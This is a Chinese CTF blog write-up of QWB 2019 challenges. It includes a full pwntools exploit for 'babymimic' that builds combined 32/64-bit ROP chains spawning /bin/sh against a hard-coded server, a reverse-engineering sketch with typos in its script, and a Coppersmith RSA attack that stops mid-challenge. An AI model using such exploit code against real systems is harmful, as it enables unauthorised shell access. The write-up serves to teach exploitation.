<!DOCTYPE html>
<html lang=en>
<head><meta name="generator" content="Hexo 3.9.0">
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
<meta name="keywords" content="ctf">
<meta property="og:type" content="article">
<meta property="og:title" content="强网杯2019">
<meta property="og:url" content="http://1nv0k3r.me/2019/01/18/强网杯2019/index.html">
<meta property="og:site_name" content="1nv0k3r&#39;s blog">
<meta property="og:description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/2.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/3.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/4.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/5.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/6.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/7.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/8.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/9.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/10.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/11.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/12.png">
<meta property="og:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/1.png">
<meta property="og:updated_time" content="2019-05-30T02:13:32.854Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="强网杯2019">
<meta name="twitter:description" content="babymimic拟态防御…惊了 程序提供了两个EFL文件: 32位: https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof 64位: https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof 漏洞点都很明显, 都是简单的栈溢出 32位:  64位:  检查保护, 虽然开了">
<meta name="twitter:image" content="http://1nv0k3r.me/2019/01/18/强网杯2019/2.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>强网杯2019</title>
    <!-- styles -->
    <link rel="stylesheet" href="/css/style.css">
    <!-- persian styles -->
    
      <link rel="stylesheet" href="/css/rtl.css">
    
    <!-- rss -->
    
    
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/tags/">tags</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2019/01/18/如何提高git-clone的速度/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/01/15/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&text=强网杯2019"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&is_video=false&description=强网杯2019"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=强网杯2019&body=Check out this article: http://1nv0k3r.me/2019/01/18/强网杯2019/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&title=强网杯2019"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://1nv0k3r.me/2019/01/18/强网杯2019/&name=强网杯2019&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#babymimic"><span class="toc-number">1.</span> <span class="toc-text">babymimic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#justre"><span class="toc-number">2.</span> <span class="toc-text">justre</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto"><span class="toc-number">3.</span> <span class="toc-text">crypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#签到"><span class="toc-number">4.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#鲲or鳗orGame"><span class="toc-number">5.</span> <span class="toc-text">鲲or鳗orGame</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AD"><span class="toc-number">6.</span> <span class="toc-text">强网先锋-AD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-辅助"><span class="toc-number">7.</span> <span class="toc-text">强网先锋-辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网先锋-AP"><span class="toc-number">8.</span> <span class="toc-text">强网先锋-AP</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        强网杯2019
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">1nv0k3r's blog</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-01-18T11:41:05.000Z" itemprop="datePublished">2019-01-18</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/ctf/">ctf</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="babymimic"><a href="#babymimic" class="headerlink" title="babymimic"></a>babymimic</h3><p>拟态防御…惊了</p>
<p>程序提供了两个EFL文件:</p>
<p>32位: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof">https://github.com/Inv0k3r/pwnable_files/raw/master/_stkof</a></p>
<p>64位: <a href="https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof">https://github.com/Inv0k3r/pwnable_files/raw/master/__stkof</a></p>
<p>漏洞点都很明显, 都是简单的栈溢出</p>
<p>32位:</p>
<p><img src="/2019/01/18/强网杯2019/2.png" alt="img"></p>
<p>64位:</p>
<p><img src="/2019/01/18/强网杯2019/3.png" alt="img"></p>
<p>检查保护, 虽然开了canary, 但是栈溢出的那个函数并没有check, 猜测应该是出题人手动把check nop了</p>
<p><img src="/2019/01/18/强网杯2019/4.png" alt="img"></p>
<p>后续测试中, 发现无法leak任何内容, 猜测服务器对返回的内容进行了检测, 由于程序是静态编译的, 所以我们可以尝试构造ROP链来getshell</p>
<p><img src="/2019/01/18/强网杯2019/5.png" alt="img"></p>
<p>这里使用ROPGenerator, 生成ROP chain以后, 溢出到返回地址即可getshell</p>
<p><img src="/2019/01/18/强网杯2019/6.png" alt="img"></p>
<p>但是打服务器的时候打不下来, 因为服务器用的拟态防御, 我们无法知道交互的是32位程序还是64位程序</p>
<p>当然我们可以通过不断运行两个架构的攻击脚本来尝试爆破, 但是服务器设置了爆破限制, 随机8位的字符, 然后sha256加密, 给出5位,我们需要爆破另外3位, 这样就降低了爆破成功的可能性(我爆了一天没成功</p>
<p>所以我们需要一个payload, 来同时对64和32进行攻击</p>
<p>经过分析可知, 32位程序的返回地址偏移是272, 而64位是280</p>
<p>所以我们可以利用中间这8个字节, 来判断服务器是32位还是64位</p>
<p>32位程序使用4字节作为一个地址, 所以8字节可以让我们写两条gadget</p>
<p>由于无法leak任何地址(带出来数据就会触发服务器的check导致连接关闭), 所以我们不知道栈地址, 没法直接跳转</p>
<p>所以我们可以通过修改栈顶指针寄存器, 来让程序跳转到栈上的另外一个位置</p>
<p>尝试找一下gadget:</p>
<p><img src="/2019/01/18/强网杯2019/7.png" alt="img"></p>
<p>可以写add esp 0xc进去, 那么栈顶将被修改到当前栈地址+ 0xc</p>
<p>这样一来, 针对32位程序的payload可以写成:</p>
<pre><code>payload = 272 * &apos;a&apos; + p32(add_esp_0xc) + 0xc* &apos;a&apos; + ROP链
</code></pre><p>其中的0x10字节, 我们可以用来写64位程序的ROP链</p>
<p>我们用ROPGenerator生成的ROP chain:</p>
<p>32位:</p>
<p><img src="/2019/01/18/强网杯2019/8.png" alt="img"></p>
<p>64位:</p>
<p><img src="/2019/01/18/强网杯2019/9.png" alt="img"></p>
<p>生成的rop链中, 32位的长度为92字节, 64位的长度为112字节</p>
<p>而我们的payload</p>
<p><code>payload = 272 * &#39;a&#39; + p32(add_esp_0xc) + 0xc * &#39;a&#39; + 32位ROP链</code>中, 有8字节可用, 所以我们可以写一个<code>add rsp 0x??; ret</code>的方式来进行跳转, 跳到32位ROP链之后, 找一下64位程序的gadget:</p>
<p><img src="/2019/01/18/强网杯2019/10.png" alt="img"></p>
<p>各种长度都有，很舒服</p>
<p>我们32位程序的ROP链, 长度是92字节, 所以我们的64位程序跳转的时候要留给32位ROP链足够空间</p>
<p>这里选择0x68这个gadget</p>
<p>那么<code>payload=272 * &#39;a&#39; + p32(add_esp_0xc) + &#39;b&#39; * 4 + p64(add_rsp_0x68) + 92字节的32位程序的ROP + 112字节的64位程序的ROP</code></p>
<p>后续测试发现ROPGenerator生成的32位ROP链无法getshell…最后换了ROPgadget生成:</p>
<pre><code>ROPgadget --binary &quot;_stkof&quot; --ropchain
</code></pre><p><img src="/2019/01/18/强网杯2019/11.png" alt="img"></p>
<p>长度是136字节, 所以对上面payload进行修改, 64位的gadget需要跳到更远, 所以选择了0xd8这个gadget:</p>
<pre><code>payload=272*&apos;a&apos; + p32(add_esp_0xc) + &apos;b&apos; * 4 + p64(add_rsp_0xd8) + 136字节的32位程序的ROP + (0xd8 - 136) * &apos;c&apos; + 112字节的64位程序的ROP
</code></pre><p>成功getshell:</p>
<p><img src="/2019/01/18/强网杯2019/12.png" alt="img"></p>
<p>最终脚本:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(hash, string)</span>:</span></span><br><span class="line">    dic = <span class="string">'1234567890abcdef'</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> dic:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> dic:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> dic:</span><br><span class="line">                            temp = string + i + j + k + l + m + n</span><br><span class="line">                            <span class="keyword">if</span> hash == hashlib.sha256(temp.decode(<span class="string">'hex'</span>)).hexdigest():</span><br><span class="line">                                info(<span class="string">"Found: "</span> + temp)</span><br><span class="line">                                <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'49.4.51.149'</span>, <span class="number">25391</span>)</span><br><span class="line">r.recvuntil(<span class="string">'hexdigest()='</span>)</span><br><span class="line">hexstr = r.recv(<span class="number">64</span>)</span><br><span class="line">r.recvuntil(<span class="string">"encode('hex')="</span>)</span><br><span class="line">s = r.recv(<span class="number">10</span>)</span><br><span class="line">info(<span class="string">"hash: "</span> + hexstr)</span><br><span class="line">info(<span class="string">"skr:  "</span> + s)</span><br><span class="line">r.sendlineafter(<span class="string">"skr.encode('hex')="</span>, check(hexstr, s))</span><br><span class="line">r.sendlineafter(<span class="string">'teamtoken:'</span>, <span class="string">'068c639545a4febbcbcb8c97b494cc21'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'your flag file --&gt; '</span>)</span><br><span class="line">flag_file_name = r.recv(<span class="number">37</span>)</span><br><span class="line">info(<span class="string">"flag file: "</span> + flag_file_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># start pwn</span></span><br><span class="line">off = <span class="number">0x0</span></span><br><span class="line">rop64 = <span class="string">''</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000069e138</span> + off)  <span class="comment"># Constant: 0x69e138</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043d9d5</span> + off)  <span class="comment"># pop rdx; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0068732f6e69622f</span>)        <span class="comment"># Constant: 0x68732f6e69622f</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043dbc4</span> + off)  <span class="comment"># mov qword ptr [rax+0x8], rdx; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004005f6</span> + off)  <span class="comment"># pop rdi; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000069e140</span> + off)  <span class="comment"># cmd: '/bin/sh\x00'</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000405895</span> + off)  <span class="comment"># pop rsi; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000000000</span>)        <span class="comment"># argv: 0x0</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x0000000000497d37</span> + off)  <span class="comment"># Address of ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000040dc33</span> + off)  <span class="comment"># xor edx, edx; jmp rax</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000043b97c</span> + off)  <span class="comment"># pop rax; ret</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x000000000000003b</span>)        <span class="comment"># Constant: 0x3b</span></span><br><span class="line">rop64 += pack(<span class="string">'&lt;Q'</span>, <span class="number">0x00000000004011dc</span> + off)  <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">rop32 = <span class="string">''</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop32 += <span class="string">'/bin'</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080a8af6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop32 += <span class="string">'//sh'</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056a85</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9f2</span>) <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9060</span>) <span class="comment"># padding without overwrite ebx</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806e9cb</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080d9068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056040</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807be5a</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop32 += pack(<span class="string">'&lt;I'</span>, <span class="number">0x080495a3</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">add_esp_0xc = <span class="number">0x080a8f69</span>           <span class="comment"># : add esp, 0xc ; ret</span></span><br><span class="line">add_rsp_0xd8 = <span class="number">0x00000000004079d4</span>   <span class="comment"># : add rsp, 0xd8 ; ret</span></span><br><span class="line">r.recv()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">272</span> + p32(add_esp_0xc) + <span class="string">'b'</span> * <span class="number">4</span> + p64(add_rsp_0xd8) + rop32 + (<span class="number">0xd8</span> - len(rop32)) * <span class="string">'c'</span> + rop64</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="justre"><a href="#justre" class="headerlink" title="justre"></a>justre</h3><p>定位到check函数, 发现很多xmm指令…</p>
<p>调试一下看看结果</p>
<p>前面的部分是确定输入是否在0-9A-F之间, 并把前8个字符转成16进制形式, 第九个字符存入一个变量</p>
<p>输入1A2B3C4D5F6A7B8C9D0E</p>
<p>xmmword_405018 + 0x10 = (0x10 + 0x1A2B3C4D) ^ (0x1010101 * 0x5F + xmmword_405018 + v20)</p>
<p>上面的操作, 经过8轮运算以后, 和96字节的字符比较:</p>
<pre><code>55 8B EC 83 E4 F0 81 EC 78 02 00 00 A1 04 50 40 00 33 C4 89 84 24 74 02 00 00 0F 10 05 A8 41 40 00 A0 C0 41 40 00 56 0F 11 44 24 2C 57 F3 0F 7E 05 B8 41 40 00 66 0F D6 44 24 40 0F 10 41 0A 6A 40 88 44 24 4C 8D 84 24 FC 01 00 00 6A 00 50 0F 11 44 24 1C E8 58 0F 00 00 6A 40 8D 84 24 48 02 
</code></pre><p>xmmword_405018 = 416214C801120DF0ED93C08B7EB6971B<br>xmmword_405028 = 41537868F119106CFF3DF4E788CDFF6A<br>xmmword_405038 = 5B19BFC22CEE54810A6010AF40D2706E<br>xmmword_405048 = 671C51850A51F4B0B31932734153886F</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> Dword</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    b = i * <span class="number">0x1010101</span></span><br><span class="line">    <span class="keyword">if</span> Dword(<span class="number">0x404148</span>) ^ ((Dowrd(<span class="number">0x405018</span>) + b) &amp; <span class="number">0xffffffff</span>) == Dowrd(<span class="number">0x404148</span> + <span class="number">4</span>) ^ ((Dowrd(<span class="number">0x405018</span> + <span class="number">4</span>) + b) &amp; <span class="number">0xffffffff</span>) - <span class="number">1</span>:</span><br><span class="line">        print(hex(i), hex(Dowrd(<span class="number">0x404148</span>) ^ ((Dowrd(<span class="number">0x405018</span>) + b) &amp; <span class="number">0xffffffff</span>)))</span><br></pre></td></tr></table></figure>
<p>得到: <code>0x10 0x13242298</code></p>
<p>接下来是DES加密</p>
<h3 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h3><pre><code>[++++++++++++++++]proof completed[++++++++++++++++]
[+]Generating challenge 1
[+]n=0x381c2a94ae89869e563b600b4b9cce988197a565e027fd923bee484664d33f1a10037857ce9e0c49422470536cef963e540ab1bffbd6fe3dfda54ac04fae790c99568fe064a77d57ea17609f45d5d0f984bd4235f54b4c8b069ceac1220e743e0fcd420a5302eda89dc58497e94a01281849c0134c88d543adda2d423c3af7fL
[+]e=3
[+]m=random.getrandbits(512)
[+]c=pow(m,e,n)=0x1da185826272d2d806f3b8e036fbe2b27320defe9892175f9e18a60c39348fa2b631d386edeb98f37f18e8059360e827cea76363a3e1aaae46aef40ac0c6621576e41ab644c704a9c662c998618c7d48e17542001142d768fce50d778c3555fd3d795a7b23d72c65f6a96fd4e1e438bcca7dc963adf0baf3b135de994662b82L
[+]((m&gt;&gt;72)&lt;&lt;72)=0xfabc61918e517c9bf73b2bf5d91f30a80c19de72a995e1c47de8f9be1bb4006b6dd10a11adb95ce73613e6236aa4e91db6d5c8f07dac16000000000000000000L
[-]long_to_bytes(m).encode(&apos;hex&apos;)=
</code></pre><p>e = 3, 给了部分明文, 使用CoppersmithAttack</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n=<span class="number">0x381c2a94ae89869e563b600b4b9cce988197a565e027fd923bee484664d33f1a10037857ce9e0c49422470536cef963e540ab1bffbd6fe3dfda54ac04fae790c99568fe064a77d57ea17609f45d5d0f984bd4235f54b4c8b069ceac1220e743e0fcd420a5302eda89dc58497e94a01281849c0134c88d543adda2d423c3af7f</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">c=<span class="number">0x1da185826272d2d806f3b8e036fbe2b27320defe9892175f9e18a60c39348fa2b631d386edeb98f37f18e8059360e827cea76363a3e1aaae46aef40ac0c6621576e41ab644c704a9c662c998618c7d48e17542001142d768fce50d778c3555fd3d795a7b23d72c65f6a96fd4e1e438bcca7dc963adf0baf3b135de994662b82</span></span><br><span class="line">m=<span class="number">0xfabc61918e517c9bf73b2bf5d91f30a80c19de72a995e1c47de8f9be1bb4006b6dd10a11adb95ce73613e6236aa4e91db6d5c8f07dac16000000000000000000</span></span><br><span class="line"></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">epsilon = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = floor(nbits*(beta^<span class="number">2</span>/e-epsilon))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"upper %d bits (of %d bits) is given"</span> % (nbits-kbits, nbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m + x) ^ e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">1</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor = n</span></span><br><span class="line"><span class="keyword">print</span> m + x0</span><br><span class="line"><span class="keyword">print</span> x0</span><br></pre></td></tr></table></figure>
<p>丢到在线网站: <code>https://sagecell.sagemath.org/</code><br>得到<code>13132102744876364837010657674093125827216092673699264307134817022461255433729251935499820467653979827420832582244375851850135494237158389876362816492294802</code><br>转hex提交</p>
<pre><code>[++++++++++++++++]challenge 1 completed[++++++++++++++++]
[+]Generating challenge 2
[+]n=0x62645f7122276f971d8be2c280c50af2a4d24f64c66d887a63412eca8318139b63d3a208bea26c760f9da2a4a5532193120ef2741863e506ef56f972afbf88072de0626af4a7f119342e524c3467f2a0b593127646a08dd9edeb94772d844847a0e4adbba021ff157a1c41393840d32966ca4b425be64c5cd7be71f15f1c0c0fL
[+]e=65537
[+]m=random.getrandbits(512)
[+]c=pow(m,e,n)=0x2ea82d02c8405c04606f471756806a9d17cd0d9bedc636f7d884244745e086dbef806e4cfa440780f93abb33d5d295227df4cca71783f6693a6ea7c7775188f8cd814fadaec1a67087e5b6e1d3f51985243f057f667c663f59fbf638ea745b7aa6f57deff8da242b18086c2e8dba028613f01d100269d3342f0094e9c91eddL
[+]((p&gt;&gt;128)&lt;&lt;128)=0xa19bcc2975554445de9f02e634661d4f6a665336a0af5c6a6f93758a8d23dfec8b258004a431974f371132c3ca7696ef00000000000000000000000000000000L
[-]long_to_bytes(m).encode(&apos;hex&apos;)=$
